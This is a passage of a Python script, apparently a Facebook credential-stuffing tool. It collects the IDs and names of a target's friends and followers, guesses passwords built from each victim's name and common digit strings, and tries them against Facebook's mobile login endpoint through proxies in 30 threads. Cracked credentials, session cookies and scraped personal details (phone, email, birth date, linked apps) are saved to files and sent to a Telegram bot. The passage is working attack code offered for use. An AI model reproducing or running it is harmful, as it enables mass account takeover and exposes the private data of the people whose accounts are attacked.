        try:
            koh2 = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
            for pi in koh2['subscribers']['data']:
                try:id.append(pi['id']+'|'+pi['name'])
                except:continue
            print('[>>] Total Id : '+str(len(id)))
            setting()
        except requests.exceptions.ConnectionError:
            print('[✖] No Connection  ')
            exit()
        except (KeyError,IOError):
            print('[✘] Id Is Not Public')
            time.sleep(3)
            follower()



def TakeFile():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        
        jum = input('[?] INPUT FILE : ')
        for line in open(jum, 'r').readlines():
            id.append(line.strip())
        print('[•] Total Id : '+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
            print('[✘] No Connection  ')
            exit()
    except (KeyError,IOError):
            print('[✘] Id Is Not Public')
            time.sleep(3)
            follower()

def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        jum = int(input('» Number ID | عدد الايديات : '))
    except ValueError:
        print('{k}[✘] NOT PUBLIC ID ')
        exit()
    if jum<1 or jum>100:
        print('[✘] Your limit error')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        
        yz+=1
        kl = input('» ID  '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            head = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' }
            if len(id) == 0:
                params = {'fields': 'friends', 'access_token':token}
            else:
                params = {'fields': 'friends', 'access_token':token}
            b = requests.get('https://graph.facebook.com/{}'.format(user), params=params, headers=head, cookies={'cookies': cok }).json()
            for mi in b['friends']['data']:
                
                try:
                    iso = mi['id'] + '|' + mi['name']
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('{k}[✘] Error  ')
            exit()
    try:
        print('')
        print(f'''[•] Total ID | عدد الايديات {H}» ''' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        print('[✘] No Internet connection ')
        back()
    except (KeyError,IOError):
        print(f'''[✘] Not Public  {u}''')
        time.sleep(3)
        back()





def setting():
    print('\x1b[2;36m ~~~~~~~~~~~~~~~~~~~~~~~')
    print('» 1- Id old | الاولويه في الفحص للحسابات القديمه')
    print('» 2- Id New | الاولويه في الفحص للحسابات الجديده')
    print('» 3- Old+new | قـديـمـه وجـديده ')
    print('')
    hu = input('» Chose : ')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print('>> PILIH YANG BENAR BANG ')
        exit()
    print('>> 1. Mobile ')
    print('')
    hc = input('» Chose : ')
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        print('>> PILIH YANG BENAR BANG ')
        setting()
    elif hc in ('4', '04'):
        method.append('mbasic')
    else:
        method.append('mobile')
    print('')
    _jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y/t ) ')
    if _jembot_ in ('',):
        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ('y', 'Y'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = input('>> Password Manual : باسورد يدوي (T عشوائي)( Y/t ) ')
    if pwplus in ('y', 'Y'):
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
        pwku = input('>> Masukkan Password Tambahan : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()


def passwrd():
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append('112233445566')
                    pwv.append('1122334455')
                    pwv.append('1234512345')
                    pwv.append('11223344556677')
                    pwv.append('11223344@@')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(frs + '123')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append('112233445566')
                pwv.append('1122334455')
                pwv.append('123412345')
                pwv.append('11223344556677')
                pwv.append('11223344@@')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('')
    cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
    print(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
    print(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
    print('')
    print('>> Lanjut Crack Kembali ( Y/t ) ? ')
    woi = input('>> Pilih : ')
    if woi in ('y', 'Y'):
        back()
    else:
        print(f'''\t{x}[=]{k} Been completed {x} <> ''')
        time.sleep(2)
        exit()


def crack(idf, pwv):
    global cp, ok, ok, loop
    bi = random.choice([
        u,
        k,
        kk,
        b,
        h,
        hh])
    pers = loop * 100 / len(id2)
    fff = '%'
    print('\r%s <𝐇𝐀𝐍𝐈> %s/%s » [OK] %s » [CP] %s » %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        
        try:
            tix = time.time()
            nip = random.choice(prox)
            proxs = {
                'http': 'socks4://' + nip }
            ses.headers.update({
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'accept-encoding': 'gzip, deflate br',
                'referer': 'https://m.facebook.com/',
                'sec-fetch-dest': 'document',
                'sec-fetch-user': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'mark.via.gp',
                'dnt': '1',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'user-agent': ua2,
                'upgrade-insecure-requests': '1',
                'Host': 'm.facebook.com' })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/',
                'pass': pw,
                'flow': 'login_no_pin',
                'uid': idf,
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1) }
            ses.headers.update({
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'accept-encoding': 'gzip, deflate br',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'sec-fetch-dest': 'document',
                'sec-fetch-user': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'mark.via.gp',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'upgrade-insecure-requests': '1',
                'cache-control': 'max-age=0',
                'Host': 'm.facebook.com' })
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n@H_6_N  -  @K_Q_A\n\t\t\t\t\t'''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='SESI'))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))
            
            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n@H_6_N  -  @K_Q_A\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title=' NO SESI'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
            
    
                if 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
                    
                    try:nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:passnomer = ''
                    
                    try:email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:passemail = ''
                    
                    try:ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:passttl = ''
                    
                    try:teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:passteman = ''
                    
                    try:pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:passpengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass
                    infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n⋘─────━𓆩𝐇𝐀𝐍𝐈𓆪‏━─────⋙\n@H_6_N  -  @K_Q_A'''
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
                    (hit1, hit2) = (0, 0)
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
                                hit2 += 1
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
                                hit2 += 1
                    print('\n')
                    statusok = f'''\n   \n{infoakun}\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1






def O():
    try:
        os.remove('ID.txt')
        os.remove('ok.coki.txt')
        os.remove('.token.txt')
        os.remove('.cok.txt')
    except FileNotFoundError as error:        
        exit()
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    try:os.system('pkg install play-audio')
    except:pass
    try:os.system('clear')
    except:pass
    Login()